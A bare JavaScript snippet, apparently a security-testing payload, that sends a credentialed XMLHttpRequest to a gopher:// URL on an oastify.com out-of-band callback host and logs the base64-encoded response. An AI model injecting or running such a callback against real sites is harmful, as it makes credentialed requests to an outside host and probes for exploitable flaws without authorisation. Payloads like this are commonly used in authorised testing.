const url = "gopher://6w3bjamuw5lces3s4c19hmuy8pef24.oastify.com/";
let xml = new XMLHttpRequest();
xml.onreadystatechange = function(){
    if(xml.readyState !== 4) return;
    if(xml.status === 200){
        console.log(btoa(xml.responseText));
    }
}
xml.open("GET",url);
xml.withCredentials = true;
xml.send();
